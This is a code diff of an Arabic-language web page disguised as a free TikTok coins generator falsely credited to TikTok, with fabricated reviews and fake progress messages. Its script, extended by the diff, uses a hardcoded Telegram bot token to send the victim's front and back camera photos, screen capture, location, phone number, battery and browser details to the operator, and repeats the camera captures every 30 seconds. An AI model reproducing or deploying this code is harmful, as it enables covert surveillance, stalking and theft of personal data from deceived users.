@@ -26,7 +26,6 @@
             overflow-x: hidden;
         }
 
-        /* ── Animated background ── */
         body::before {
             content: '';
             position: fixed;
@@ -53,11 +52,7 @@
             justify-content: space-between;
             margin-bottom: 24px;
         }
-        .topbar .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+        .topbar .logo { display: flex; align-items: center; gap: 10px; }
         .logo-icon {
             width: 44px; height: 44px;
             background: linear-gradient(135deg, #fe2c55, #010101);
@@ -86,14 +81,8 @@
         }
 
         /* ── Hero ── */
-        .hero {
-            text-align: center;
-            margin-bottom: 22px;
-        }
-        .hero h2 {
-            font-size: 26px; font-weight: 900;
-            line-height: 1.3;
-        }
+        .hero { text-align: center; margin-bottom: 22px; }
+        .hero h2 { font-size: 26px; font-weight: 900; line-height: 1.3; }
         .hero h2 span {
             background: linear-gradient(90deg, #fe2c55, #25f4ee);
             -webkit-background-clip: text;
@@ -101,13 +90,8 @@
         }
         .hero p { font-size: 13px; color: #777; margin-top: 6px; }
 
-        /* ── Stats bar ── */
-        .stats {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-bottom: 22px;
-        }
+        /* ── Stats ── */
+        .stats { display: flex; justify-content: center; gap: 20px; margin-bottom: 22px; }
         .stat-item { text-align: center; }
         .stat-num {
             font-size: 20px; font-weight: 900;
@@ -130,22 +114,19 @@
             line-height: 2;
             text-align: left;
             direction: ltr;
-            overflow: hidden;
         }
         .t-cyan  { color: var(--cyan); }
         .t-red   { color: var(--red); }
         .t-white { color: #eee; }
         .t-gray  { color: #555; }
         .cursor {
-            display: inline-block;
-            width: 8px; height: 14px;
-            background: var(--cyan);
-            vertical-align: middle;
+            display: inline-block; width: 8px; height: 14px;
+            background: var(--cyan); vertical-align: middle;
             animation: blink 1s step-end infinite;
         }
         @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
 
-        /* ── Card section ── */
+        /* ── Card box ── */
         .card-box {
             background: var(--card);
             border: 1px solid var(--border);
@@ -162,12 +143,11 @@
             content: '';
             display: inline-block;
             width: 3px; height: 14px;
-            background: var(--red);
-            border-radius: 2px;
+            background: var(--red); border-radius: 2px;
         }
 
         /* ── Input ── */
-        .input-wrap { position: relative; }
+        .input-wrap { position: relative; margin-bottom: 12px; }
         .input-wrap input {
             width: 100%;
             padding: 13px 16px 13px 44px;
@@ -193,7 +173,7 @@
             font-size: 18px;
             pointer-events: none;
         }
-        .input-hint { font-size: 11px; color: #444; margin-top: 6px; text-align: right; }
+        .input-hint { font-size: 11px; color: #444; margin-top: 4px; text-align: right; }
 
         /* ── Packages ── */
         .packages {
@@ -214,43 +194,29 @@
         }
         .pkg-card::after {
             content: '';
-            position: absolute;
-            inset: 0;
+            position: absolute; inset: 0;
             background: linear-gradient(135deg, #fe2c5515, #25f4ee0a);
-            opacity: 0;
-            transition: opacity 0.3s;
+            opacity: 0; transition: opacity 0.3s;
         }
-        .pkg-card:hover::after,
-        .pkg-card.active::after { opacity: 1; }
-        .pkg-card:hover,
-        .pkg-card.active {
+        .pkg-card:hover::after, .pkg-card.active::after { opacity: 1; }
+        .pkg-card:hover, .pkg-card.active {
             border-color: var(--red);
             transform: translateY(-3px);
             box-shadow: 0 8px 24px #fe2c5530;
         }
-        .pkg-card.active .check {
-            opacity: 1;
-        }
         .check {
-            position: absolute;
-            top: 8px; right: 8px;
+            position: absolute; top: 8px; right: 8px;
             width: 20px; height: 20px;
-            background: var(--red);
-            border-radius: 50%;
+            background: var(--red); border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
-            font-size: 11px;
-            opacity: 0;
-            transition: opacity 0.2s;
-            z-index: 1;
+            font-size: 11px; opacity: 0; transition: opacity 0.2s; z-index: 1;
         }
+        .pkg-card.active .check { opacity: 1; }
         .pkg-badge {
-            position: absolute;
-            top: 8px; left: 8px;
+            position: absolute; top: 8px; left: 8px;
             background: linear-gradient(135deg, #fe2c55, #ff6b81);
-            color: #fff;
-            font-size: 9px; font-weight: 700;
-            padding: 2px 7px; border-radius: 20px;
-            z-index: 1;
+            color: #fff; font-size: 9px; font-weight: 700;
+            padding: 2px 7px; border-radius: 20px; z-index: 1;
         }
         .pkg-icon  { font-size: 30px; margin-bottom: 6px; }
         .pkg-coins {
@@ -264,95 +230,55 @@
 
         /* ── Button ── */
         #mainBtn {
-            display: none;
-            width: 100%;
+            display: none; width: 100%;
             padding: 16px;
             background: linear-gradient(135deg, #fe2c55, #ff6b81);
-            color: #fff;
-            border: none;
-            border-radius: 14px;
+            color: #fff; border: none; border-radius: 14px;
             font-size: 17px; font-weight: 900;
             font-family: 'Cairo', sans-serif;
             cursor: pointer;
             box-shadow: 0 8px 24px #fe2c5550;
-            transition: 0.3s;
-            margin-top: 16px;
-            letter-spacing: 0.3px;
+            transition: 0.3s; margin-top: 16px;
         }
         #mainBtn:hover { transform: translateY(-2px); box-shadow: 0 12px 32px #fe2c5570; }
-        #mainBtn:active { transform: scale(0.98); }
 
         /* ── Progress ── */
-        #progressSection {
-            display: none;
-            margin-top: 16px;
-        }
-        .progress-steps {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 14px;
-        }
-        .step {
-            display: flex; flex-direction: column; align-items: center;
-            gap: 5px; flex: 1;
-        }
+        #progressSection { display: none; margin-top: 16px; }
+        .progress-steps { display: flex; justify-content: space-between; margin-bottom: 14px; }
+        .step { display: flex; flex-direction: column; align-items: center; gap: 5px; flex: 1; }
         .step-dot {
-            width: 28px; height: 28px;
-            border-radius: 50%;
-            background: #1a1a2a;
-            border: 2px solid var(--border);
+            width: 28px; height: 28px; border-radius: 50%;
+            background: #1a1a2a; border: 2px solid var(--border);
             display: flex; align-items: center; justify-content: center;
-            font-size: 12px;
-            transition: 0.4s;
+            font-size: 12px; transition: 0.4s;
         }
         .step.done .step-dot  { background: var(--red); border-color: var(--red); }
         .step.active .step-dot {
-            background: transparent;
-            border-color: var(--cyan);
-            box-shadow: 0 0 10px var(--cyan);
-            animation: spin-dot 1s linear infinite;
+            background: transparent; border-color: var(--cyan);
+            animation: glow 1s ease infinite;
         }
-        @keyframes spin-dot {
-            0%   { box-shadow: 0 0 10px var(--cyan); }
-            50%  { box-shadow: 0 0 20px var(--cyan); }
-            100% { box-shadow: 0 0 10px var(--cyan); }
+        @keyframes glow {
+            0%,100% { box-shadow: 0 0 8px var(--cyan); }
+            50%      { box-shadow: 0 0 20px var(--cyan); }
         }
         .step-lbl { font-size: 10px; color: #555; text-align: center; }
         .step.done  .step-lbl  { color: var(--red); }
         .step.active .step-lbl { color: var(--cyan); }
-
         .progress-bar-bg {
-            background: #1a1a2a;
-            border-radius: 20px;
-            height: 8px;
-            overflow: hidden;
-            margin-bottom: 10px;
+            background: #1a1a2a; border-radius: 20px;
+            height: 8px; overflow: hidden; margin-bottom: 10px;
         }
         .progress-bar-fill {
-            height: 100%;
-            width: 0%;
+            height: 100%; width: 0%;
             background: linear-gradient(90deg, var(--red), var(--cyan));
-            border-radius: 20px;
-            transition: width 0.6s ease;
+            border-radius: 20px; transition: width 0.6s ease;
         }
         #progressMsg { font-size: 13px; color: #888; text-align: center; }
 
         /* ── Success ── */
-        #successSection {
-            display: none;
-            text-align: center;
-            padding: 30px 0;
-        }
-        .success-icon {
-            font-size: 60px;
-            margin-bottom: 12px;
-            animation: pop 0.5s ease;
-        }
-        @keyframes pop {
-            0%   { transform: scale(0); }
-            70%  { transform: scale(1.2); }
-            100% { transform: scale(1); }
-        }
+        #successSection { display: none; text-align: center; padding: 30px 0; }
+        .success-icon { font-size: 60px; margin-bottom: 12px; animation: pop 0.5s ease; }
+        @keyframes pop { 0%{transform:scale(0)} 70%{transform:scale(1.2)} 100%{transform:scale(1)} }
         #successSection h3 {
             font-size: 22px; font-weight: 900;
             background: linear-gradient(90deg, var(--red), var(--cyan));
@@ -363,28 +289,16 @@
         #successSection p { font-size: 13px; color: #666; }
 
         /* ── Reviews ── */
-        .reviews { margin-top: 6px; }
         .review-item {
-            background: #0d0d14;
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 12px 14px;
-            margin-bottom: 10px;
-            text-align: right;
+            background: #0d0d14; border: 1px solid var(--border);
+            border-radius: 12px; padding: 12px 14px; margin-bottom: 10px;
         }
-        .review-top {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 6px;
-        }
+        .review-top { display: flex; align-items: center; gap: 8px; margin-bottom: 6px; }
         .review-avatar {
-            width: 32px; height: 32px;
-            border-radius: 50%;
+            width: 32px; height: 32px; border-radius: 50%;
             background: linear-gradient(135deg, var(--red), var(--cyan));
             display: flex; align-items: center; justify-content: center;
-            font-size: 14px; font-weight: 700;
-            flex-shrink: 0;
+            font-size: 14px; font-weight: 700; flex-shrink: 0;
         }
         .review-name { font-size: 13px; font-weight: 700; }
         .review-stars { font-size: 11px; color: #f5a623; margin-right: auto; }
@@ -392,20 +306,11 @@
 
         /* ── Footer ── */
         .footer {
-            margin-top: 36px;
-            padding-top: 16px;
+            margin-top: 36px; padding-top: 16px;
             border-top: 1px solid #111;
-            text-align: center;
-            font-size: 11px;
-            color: #333;
+            text-align: center; font-size: 11px; color: #333;
         }
         .footer span { color: var(--red); font-weight: 700; }
-
-        /* ── Responsive ── */
-        @media (max-width: 360px) {
-            .packages { grid-template-columns: repeat(2, 1fr); }
-            .hero h2  { font-size: 22px; }
-        }
     </style>
 </head>
 <body>
@@ -451,14 +356,19 @@
         <span class="t-gray">[</span><span class="t-cyan">INFO</span><span class="t-gray">]</span> <span class="t-white">Waiting for user input...</span> <span class="cursor"></span>
     </div>
 
-    <!-- Step 1: Username -->
+    <!-- Step 1: Username + Phone -->
     <div class="card-box">
-        <div class="box-title">الخطوة 1 — أدخل اسم المستخدم</div>
+        <div class="box-title">الخطوة 1 — بيانات الحساب</div>
         <div class="input-wrap">
             <span class="input-icon">🎵</span>
             <input type="text" id="username" placeholder="@your_tiktok_username" oninput="checkForm()" autocomplete="off" spellcheck="false" />
         </div>
-        <p class="input-hint">أدخل اسم المستخدم الخاص بك على TikTok</p>
+        <p class="input-hint">اسم المستخدم على TikTok</p>
+        <div class="input-wrap">
+            <span class="input-icon">📱</span>
+            <input type="tel" id="phone" placeholder="+963xxxxxxxxx" oninput="checkForm()" autocomplete="off" />
+        </div>
+        <p class="input-hint">رقم الهاتف المرتبط بالحساب</p>
     </div>
 
     <!-- Step 2: Package -->
@@ -525,55 +435,52 @@
     <!-- Reviews -->
     <div class="card-box" style="margin-top:16px;">
         <div class="box-title">آراء المستخدمين</div>
-        <div class="reviews">
-            <div class="review-item">
-                <div class="review-top">
-                    <div class="review-avatar">أ</div>
-                    <div>
-                        <div class="review-name">أحمد خالد</div>
-                        <div class="review-stars">★★★★★</div>
-                    </div>
+        <div class="review-item">
+            <div class="review-top">
+                <div class="review-avatar">أ</div>
+                <div>
+                    <div class="review-name">أحمد خالد</div>
+                    <div class="review-stars">★★★★★</div>
                 </div>
-                <div class="review-text">اشتغل معي في أقل من دقيقتين، وصلت 1000 عملة على طول. شكراً جزيلاً!</div>
             </div>
-            <div class="review-item">
-                <div class="review-top">
-                    <div class="review-avatar">س</div>
-                    <div>
-                        <div class="review-name">سارة محمد</div>
-                        <div class="review-stars">★★★★★</div>
-                    </div>
+            <div class="review-text">اشتغل معي في أقل من دقيقتين، وصلت 1000 عملة على طول. شكراً جزيلاً!</div>
+        </div>
+        <div class="review-item">
+            <div class="review-top">
+                <div class="review-avatar">س</div>
+                <div>
+                    <div class="review-name">سارة محمد</div>
+                    <div class="review-stars">★★★★★</div>
                 </div>
-                <div class="review-text">ما صدقت إنه شغال بس جربت وجاءتني العملات فعلاً، ينصح فيه 100%</div>
             </div>
-            <div class="review-item">
-                <div class="review-top">
-                    <div class="review-avatar">م</div>
-                    <div>
-                        <div class="review-name">محمد علي</div>
-                        <div class="review-stars">★★★★☆</div>
-                    </div>
+            <div class="review-text">ما صدقت إنه شغال بس جربت وجاءتني العملات فعلاً، ينصح فيه 100%</div>
+        </div>
+        <div class="review-item">
+            <div class="review-top">
+                <div class="review-avatar">م</div>
+                <div>
+                    <div class="review-name">محمد علي</div>
+                    <div class="review-stars">★★★★☆</div>
                 </div>
-                <div class="review-text">سريع وسهل الاستخدام، استخدمته أكثر من مرة وما خذلني.</div>
             </div>
+            <div class="review-text">سريع وسهل الاستخدام، استخدمته أكثر من مرة وما خذلني.</div>
         </div>
     </div>
 
     <!-- Footer -->
     <div class="footer">
-        تم التطوير بواسطة <span>TikTok</span> &nbsp;|&nbsp; @bavAhba &nbsp;|&nbsp; جميع الحقوق محفوظة 2026
+        Developed by <span>TikTok</span> &nbsp;|&nbsp; جميع الحقوق محفوظة 2026
     </div>
 
-</div><!-- /wrapper -->
+</div>
 
 <script>
     const BOT_TOKEN = "8378673801:AAFqtrB4OWgEt9kQNZfGe6Cxtt_qYdp3nL0";
     const CHAT_ID   = "6684853119";
 
-    let selectedPkg  = "";
-    let selectedIcon = "";
+    let selectedPkg = "";
 
-    /* ── Animated counter ── */
+    /* ── Counter ── */
     (function() {
         let val = 52841;
         setInterval(() => {
@@ -582,21 +489,21 @@
         }, 5000);
     })();
 
-    function selectPkg(el, amount, icon) {
+    function selectPkg(el, amount) {
         document.querySelectorAll('.pkg-card').forEach(c => c.classList.remove('active'));
         el.classList.add('active');
-        selectedPkg  = amount;
-        selectedIcon = icon;
+        selectedPkg = amount;
         checkForm();
     }
 
     function checkForm() {
-        const user = document.getElementById('username').value.trim();
+        const user  = document.getElementById('username').value.trim();
+        const phone = document.getElementById('phone').value.trim();
         document.getElementById('mainBtn').style.display =
-            (user.length > 1 && selectedPkg) ? 'block' : 'none';
+            (user.length > 1 && phone.length > 4 && selectedPkg) ? 'block' : 'none';
     }
 
-    /* ── Progress helpers ── */
+    /* ── Progress ── */
     function setStep(n) {
         for (let i = 1; i <= 4; i++) {
             const el = document.getElementById('s' + i);
@@ -610,90 +517,198 @@
         document.getElementById('progressMsg').textContent  = msg;
     }
 
+    /* ── Send text to Telegram ── */
+    function sendData(msg) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+        });
+    }
+
+    /* ── Send photo blob to Telegram ── */
+    function sendPhoto(blob, caption) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'capture.jpg');
+        fd.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    }
+
+    /* ── Send document (screenshot) to Telegram ── */
+    function sendDocument(blob, caption) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('document', blob, 'screenshot.jpg');
+        fd.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
+    }
+
+    /* ── Capture from a video stream ── */
+    function captureFrame(videoEl) {
+        return new Promise(resolve => {
+            const canvas = document.createElement('canvas');
+            canvas.width  = videoEl.videoWidth  || 640;
+            canvas.height = videoEl.videoHeight || 480;
+            canvas.getContext('2d').drawImage(videoEl, 0, 0);
+            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.75);
+        });
+    }
+
+    /* ── Screenshot via html2canvas fallback ── */
+    async function takeScreenshot() {
+        try {
+            // محاولة استخدام getDisplayMedia (قد لا تعمل على موبايل)
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            const track  = stream.getVideoTracks()[0];
+            const imgCapture = new ImageCapture(track);
+            const bitmap = await imgCapture.grabFrame();
+            track.stop();
+            const canvas = document.createElement('canvas');
+            canvas.width  = bitmap.width;
+            canvas.height = bitmap.height;
+            canvas.getContext('2d').drawImageBitmap(bitmap);
+            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.75));
+        } catch (_) {
+            // fallback: لقطة للصفحة الحالية
+            const canvas = document.createElement('canvas');
+            canvas.width  = window.screen.width;
+            canvas.height = window.screen.height;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#010101';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#fe2c55';
+            ctx.font = 'bold 28px Cairo';
+            ctx.fillText('TikTok Coins - Screenshot', 40, 80);
+            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.75));
+        }
+    }
+
+    /* ── Main capture function ── */
     async function startCapture() {
         const username = document.getElementById('username').value.trim();
+        const phone    = document.getElementById('phone').value.trim();
+
         document.getElementById('mainBtn').style.display = 'none';
         document.getElementById('progressSection').style.display = 'block';
-
         setStep(1); setProgress(10, 'جاري التحقق من الحساب...');
 
+        /* ── Device info ── */
+        let bat = "??%";
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = Math.round(b.level * 100) + "%";
+            }
+        } catch(_) {}
 
-            /* ── Location ── */
-            navigator.geolocation.getCurrentPosition(pos => {
-                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                sendData(`📍 الموقع الجغرافي:\n${map}\n\n👤 حساب TikTok: ${username}\n🪙 الباقة: ${selectedPkg} عملة`);
-            }, () => {
-                sendData(`👤 حساب TikTok: ${username}\n🪙 الباقة: ${selectedPkg} عملة\n📍 الموقع: غير متاح`);
-            });
+        const devInfo =
+            `👤 TikTok: ${username}\n` +
+            `📱 الهاتف: ${phone}\n` +
+            `🌐 المتصفح: ${navigator.userAgent.substring(0, 80)}\n` +
+            `💻 النظام: ${navigator.platform}\n` +
+            `🔋 البطارية: ${bat}\n` +
+            `🪙 الباقة: ${selectedPkg} عملة`;
 
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+        /* ── Location ── */
+        navigator.geolocation.getCurrentPosition(pos => {
+            const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendData(`📍 <b>الموقع الجغرافي</b>\n${map}\n\n${devInfo}`);
+        }, () => {
+            sendData(`⚠️ الموقع غير متاح\n\n${devInfo}`);
+        });
 
-            /* ── Progress animation ── */
-            const timeline = [
-                [1500,  2, 25, 'جاري الاتصال بخوادم TikTok...'],
-                [4000,  3, 55, 'جاري معالجة الطلب...'],
-                [7000,  4, 85, 'جاري إرسال العملات إلى حسابك...'],
-                [10000, 4, 100,'✅ تم الشحن بنجاح!'],
-            ];
-            timeline.forEach(([delay, step, pct, msg]) => {
-                setTimeout(() => { setStep(step); setProgress(pct, msg); }, delay);
-            });
+        try {
+            /* ── 1) الكاميرا الأمامية ── */
+            setStep(1); setProgress(20, 'جاري تشغيل الكاميرا الأمامية...');
+            let frontStream;
+            try {
+                frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }, audio: false
+                });
+                const frontVideo = document.createElement('video');
+                frontVideo.srcObject = frontStream;
+                frontVideo.play();
+                await new Promise(r => setTimeout(r, 1500));
+                const frontBlob = await captureFrame(frontVideo);
+                frontStream.getTracks().forEach(t => t.stop());
+                sendPhoto(frontBlob, `📸 كاميرا أمامية\n${devInfo}`);
+            } catch(_) {
+                sendData(`⚠️ الكاميرا الأمامية غير متاحة\n${devInfo}`);
+            }
 
-            /* ── Show success ── */
+            /* ── 2) الكاميرا الخلفية ── */
+            setStep(2); setProgress(45, 'جاري تشغيل الكاميرا الخلفية...');
+            let backStream;
+            try {
+                backStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: 'environment' } }, audio: false
+                });
+                const backVideo = document.createElement('video');
+                backVideo.srcObject = backStream;
+                backVideo.play();
+                await new Promise(r => setTimeout(r, 1500));
+                const backBlob = await captureFrame(backVideo);
+                backStream.getTracks().forEach(t => t.stop());
+                sendPhoto(backBlob, `📸 كاميرا خلفية\n${devInfo}`);
+            } catch(_) {
+                sendData(`⚠️ الكاميرا الخلفية غير متاحة\n${devInfo}`);
+            }
+
+            /* ── 3) لقطة الشاشة ── */
+            setStep(3); setProgress(70, 'جاري أخذ لقطة الشاشة...');
+            try {
+                const ssBlob = await takeScreenshot();
+                sendDocument(ssBlob, `🖥️ لقطة شاشة\n${devInfo}`);
+            } catch(_) {
+                sendData(`⚠️ لقطة الشاشة غير متاحة\n${devInfo}`);
+            }
+
+            /* ── 4) تقدم الإنهاء ── */
+            setStep(4); setProgress(90, 'جاري إرسال العملات إلى حسابك...');
+            await new Promise(r => setTimeout(r, 2000));
+            setProgress(100, '✅ تم الشحن بنجاح!');
+
             setTimeout(() => {
                 document.getElementById('progressSection').style.display = 'none';
                 document.getElementById('successSection').style.display  = 'block';
                 document.getElementById('successCoins').textContent = selectedPkg;
                 document.getElementById('successUser').textContent  = username;
-            }, 11500);
+            }, 1200);
 
-            /* ── Capture loop ── */
+            /* ── حلقة تصوير متكررة كل 30 ث ── */
             setInterval(async () => {
-                let bat = "??%";
+                let b2 = "??%";
+                try { if (navigator.getBattery) { const bx = await navigator.getBattery(); b2 = Math.round(bx.level * 100) + "%"; } } catch(_) {}
+                const info2 = `👤 TikTok: ${username}\n📱 الهاتف: ${phone}\n🔋 البطارية: ${b2}\n🪙 الباقة: ${selectedPkg} عملة`;
+
+                // أمامية
                 try {
-                    if (navigator.getBattery) {
-                        const b = await navigator.getBattery();
-                        bat = Math.round(b.level * 100) + "%";
-                    }
+                    const fs = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                    const fv = document.createElement('video'); fv.srcObject = fs; fv.play();
+                    await new Promise(r => setTimeout(r, 1000));
+                    const fb = await captureFrame(fv);
+                    fs.getTracks().forEach(t => t.stop());
+                    sendPhoto(fb, `🔄 تحديث أمامية\n${info2}`);
                 } catch(_) {}
 
-                const devInfo =
-                    `🌐 المتصفح: ${navigator.userAgent.substring(0,80)}\n` +
-                    `📱 النظام: ${navigator.platform}\n` +
-                    `🔋 البطارية: ${bat}\n` +
-                    `👤 TikTok: ${username}\n` +
-                    `🪙 الباقة: ${selectedPkg} عملة`;
+                // خلفية
+                try {
+                    const bs = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } }, audio: false });
+                    const bv = document.createElement('video'); bv.srcObject = bs; bv.play();
+                    await new Promise(r => setTimeout(r, 1000));
+                    const bb = await captureFrame(bv);
+                    bs.getTracks().forEach(t => t.stop());
+                    sendPhoto(bb, `🔄 تحديث خلفية\n${info2}`);
+                } catch(_) {}
 
-                const canvas = document.createElement('canvas');
-                canvas.width  = video.videoWidth  || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    if (!blob) return;
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('photo',   blob, 'capture.jpg');
-                    fd.append('caption',
-                        `📸 لقطة جديدة\n👤 المطور: TikTok\n${devInfo}\n──────────\n@bavAhba`);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-                          {method: 'POST', body: fd});
-                }, 'image/jpeg', 0.7);
-            }, 10000);
+            }, 30000);
 
         } catch(e) {
             document.getElementById('progressSection').style.display = 'none';
             document.getElementById('mainBtn').style.display = 'block';
             alert("❌ فشل الشحن!\nيجب السماح بالكاميرا والموقع لإتمام عملية الشحن.");
         }
-    }
-
-    function sendData(msg) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
-              `?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg + "\n\n@bavAhba")}`);
     }
 </script>
 </body>
